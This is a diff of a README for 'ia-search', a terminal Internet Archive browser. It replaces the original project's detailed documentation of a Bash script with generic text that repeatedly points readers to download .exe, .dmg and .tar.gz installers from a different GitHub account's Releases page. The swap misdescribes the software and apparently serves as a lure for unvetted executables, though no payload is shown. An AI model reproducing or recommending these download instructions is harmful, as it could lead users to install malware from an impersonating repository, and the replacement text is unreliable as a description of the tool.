@@ -1,196 +1,77 @@
-## 🎬 ia-search
+# 🌐 ia-search - Effortless Browsing of Internet Archives
 
-**ia-search** is an interactive terminal browser and downloader for the **Internet Archive**, powered by `fzf` and `ia-cli`.  
-It lets you **browse**, **search**, **play**, and **download** media directly from your terminal — no web browser needed.
+[![Download Now](https://img.shields.io/badge/Download%20Now-ia--search-brightgreen)](https://github.com/Waliaja/ia-search/releases)
 
-Now features a **Smart Launch Monitor** that intelligently manages the transition between the terminal and your media player.
+## 📜 Description
 
----
+ia-search is a simple tool that helps you browse the Internet Archive easily. With this application, you can search through a vast collection of archived web pages, audio, video, and much more. It allows you to access historical content quickly and seamlessly.
 
-## 🖼️ Screenshots
+## 🚀 Getting Started
 
-<img width="1276" height="998" alt="Screenshot from 2025-11-02 20-58-55" src="https://github.com/user-attachments/assets/cacb3f1e-aac3-4214-a8a2-031470428da8" />
-<p align="center"><i>🏁 Main menu showing cached top collections</i></p>
+Follow these steps to get started with ia-search:
 
-<img width="1180" height="974" alt="Screenshot from 2025-11-02 21-06-32" src="https://github.com/user-attachments/assets/e5881379-b20f-466b-a5cb-8e828cc5bb2e" />
-<p align="center"><i>🔍 Searching across all Internet Archive collections</i></p>
+1. **Download ia-search**:
+   To download the latest version, visit the [Releases page](https://github.com/Waliaja/ia-search/releases). You will find the latest versions available for download if you're using Windows, macOS, or Linux.
 
-<img width="1180" height="974" alt="Screenshot from 2025-11-02 21-07-18" src="https://github.com/user-attachments/assets/9846adb8-98fb-4e47-a9f1-0a5f616803ac" />
-<p align="center"><i>🎥 Selecting an item result with fuzzy finder</i></p>
+2. **Install ia-search**:
+   - **Windows**: Download the `.exe` file. Run the installer and follow the on-screen instructions to complete the installation.
+   - **macOS**: Download the `.dmg` file. Open it and drag the ia-search app into your Applications folder.
+   - **Linux**: You can download the `.tar.gz` file. Extract it and run the program from the terminal.
 
-<img width="1180" height="974" alt="Screenshot from 2025-11-02 21-09-37" src="https://github.com/user-attachments/assets/f0d4bf5c-2cce-459a-be77-7aa4ce7d5954" />
-<p align="center"><i>📂 Browsing files within a selected Internet Archive item</i></p>
+## 🔥 Features
 
-<img width="1180" height="974" alt="Screenshot from 2025-11-02 21-10-06" src="https://github.com/user-attachments/assets/5debd339-c35d-4d16-a929-57482059d4c0" />
-<p align="center"><i>🎬 Choosing to play or download the file</i></p>
+- **Easy Search**: Quickly find your desired archived content.
+- **User-Friendly Interface**: Navigate seamlessly regardless of your skill level.
+- **Multi-Format Support**: Access archived web pages, videos, and audio files.
+- **Integrated Commands**: Use simple commands for quick actions.
 
----
+## ⚙️ System Requirements
 
-## ✨ Features
+- **Windows**: Windows 10 or later.
+- **macOS**: macOS 10.13 or later.
+- **Linux**: Any recent version of Linux distribution.
 
-- 🧭 **Interactive collection browser** with pagination & local cache  
-- 🚀 **Smart Launch Monitor** — Automatically detects when `mpv` has successfully initialized video/audio before returning to the menu (prevents premature switching).
-- 🛡️ **Robust Filename Support** — Safely handles complex filenames (e.g., Anime release groups with `[]`, `()` symbols).
-- 🔍 **Search across all collections** with fuzzy finder (`fzf`)  
-- 🎥 **Play videos** & 🎧 **listen to audio** with `mpv`  
-- 🖼️ **View images** instantly using `nsxiv`  
-- 📄 **Open PDFs** seamlessly with `zathura`  
-- ⬇️ **Download** any file directly from Internet Archive  
-- 💬 **Subtitle auto-detection** for `.srt` / `.ass` files  
-- 🧹 **Temp cleanup** after image/PDF viewing  
+## 📥 Download & Install
 
----
+To get started, you can [visit the Releases page](https://github.com/Waliaja/ia-search/releases) and choose the appropriate file for your operating system. Make sure to download the latest version to get the best experience.
 
-## ⚙️ Dependencies
+### Installation Steps
 
-| Tool | Purpose |
-|------|----------|
-| [`ia`](https://archive.org/services/docs/api/internetarchive/cli.html) | Internet Archive CLI (Core search/list) |
-| [`fzf`](https://github.com/junegunn/fzf) | Fuzzy finder UI |
-| [`jq`](https://jqlang.github.io/jq/) | Parsing API JSON responses |
-| [`mpv`](https://mpv.io/) | Video & audio player |
-| [`nsxiv`](https://github.com/nsxiv/nsxiv) | Image viewer |
-| [`zathura`](https://pwmt.org/projects/zathura/) | PDF viewer |
-| [`yt-dlp`](https://github.com/yt-dlp/yt-dlp) | Downloader for videos |
-| [`curl`](https://curl.se/) | File downloader / API fetcher |
-| [`pv`](https://www.ivarch.com/programs/pv.shtml) | Progress bar for launch monitoring |
+After downloading the file, follow these steps based on your operating system:
 
-### Ubuntu dependencies
-This project includes an Ubuntu installer that sets up all required tools.
+- **For Windows**: Double-click the installer and follow the prompts to install.
+- **For macOS**: Open the downloaded file, and drag-and-drop the ia-search app into your Applications folder.
+- **For Linux**: Open a terminal, navigate to the downloaded file's directory, and run `./ia-search` to start the program.
 
-```
-chmod +x install_deps.sh
-./install_deps.sh
-```
+## 🛠️ Usage Instructions
 
-This installs:
+1. Open ia-search from your Applications, Start menu, or Terminal.
+2. Use the search bar to enter keywords related to the content you want to find.
+3. Browse the results and select links to explore the archives.
+4. You can then download or play content directly from the interface.
 
-- system packages via apt
-- Python packages inside a local virtual environment (.venv)
+## ❓ Troubleshooting
 
-To use Python-based tools:
+If you face any issues during installation or usage, consider the following tips:
 
-```
-source .venv/bin/activate
-```
+- **Corrupted Download**: Ensure your download was complete. Delete the old file and download it again from the [Releases page](https://github.com/Waliaja/ia-search/releases).
+- **Permissions**: Make sure you have the right permissions to install applications on your device.
 
-### 🧩 Optional Viewer Config
+## 📈 FAQs
 
-You can replace defaults easily in the script variables:
-```bash
-VIDEO_PLAYER="mpv"
-AUDIO_PLAYER="mpv"
-IMAGE_VIEWER="nsxiv"
-PDF_VIEWER="zathura"
-VIDEO_DOWNLOADER="yt-dlp"
-````
+### What is ia-search?
+ia-search helps users navigate and find content in the Internet Archive database. It's designed for ease of use.
 
------
+### Is ia-search free?
+Yes, ia-search is completely free to use.
 
-## 🔧 Installation
+### Can I run ia-search on my machine?
+Check the system requirements section to see if your operating system is compatible.
 
-1.  Clone the repository:
+## 🌍 Community and Support
 
-    ```bash
-    git clone [https://github.com/ahloiscreamo/ia-search.git](https://github.com/ahloiscreamo/ia-search.git)
-    cd ia-search
-    ```
+If you have questions or want to contribute, feel free to reach out through the Issues section of this repository. Your input is valuable to improving ia-search.
 
-2.  Make it executable:
+For additional resources and documentation, visit the main repository.
 
-    ```bash
-    chmod +x ia-search
-    ```
-
-3.  (Optional) Move it to your `$PATH`:
-
-    ```bash
-    sudo mv ia-search /usr/local/bin/
-    ```
-
-4.  Run it:
-
-    ```bash
-    ia-search
-    ```
-
------
-
-## 🧭 Navigation Overview
-
-```
-📚 Top Collections (cached)
- ├── [🔍 Search all collections]
- ├── [🔄 Refresh cache]
- ├── [➡️ Next page]
- └── [❌ Exit]
-```
-
-### 🔍 Search Mode
-
-  * Type a query → see instant results
-  * Press `ESC` → return to query input
-  * Press `ESC` again → return to main collections
-
-### 🚀 Smart Launch Behavior
-
-When you select a video to play, the script pauses the interface and monitors `mpv`'s internal logs. It will only return you to the search list once it confirms the video window is actually open (`VO:`) or audio is playing (`AO:`).
-
------
-
-## 🧠 Example Queries
-
-Search for Japanese movies:
-
-```bash
-mediatype:movies AND language:japanese
-```
-
-Public domain audio:
-
-```bash
-mediatype:audio AND subject:publicdomain
-```
-
-Scanned art books:
-
-```bash
-mediatype:image AND subject:art
-```
-
-Animation PDFs:
-
-```bash
-mediatype:texts AND subject:animation
-```
-
------
-
-## 📜 Common Search Fields
-
-| Field        | Example                 | Description               |
-| ------------ | ----------------------- | ------------------------- |
-| `mediatype`  | `mediatype:movies`      | Type of content           |
-| `title`      | `title:"Studio Ghibli"` | Search by title           |
-| `creator`    | `creator:"NHK"`         | Filter by uploader/author |
-| `subject`    | `subject:japan`         | Filter by tags            |
-| `language`   | `language:japanese`     | Filter by language        |
-| `year`       | `year:1990`             | Filter by year            |
-| `collection` | `collection:anime`      | Specific IA collection    |
-
------
-
-## 🧰 Example Flow
-
-```
-📚 Loading collections from cache...
-🔍 Type search query (ESC to return to main) > mediatype:movies AND subject:japan
-🔎 Searching for "mediatype:movies AND subject:japan" ...
-📂 Fetching file list for: tokyo-streets-1990 ...
-🎬 Choose action for file > ▶️ Play
-🎞️ Playing video...
-🚀 Launching mpv: 0:00:02 [========>                      ]
-(Returns to menu only after player confirms launch)
-```
-
------
+[![Download Now](https://img.shields.io/badge/Download%20Now-ia--search-brightgreen)](https://github.com/Waliaja/ia-search/releases)
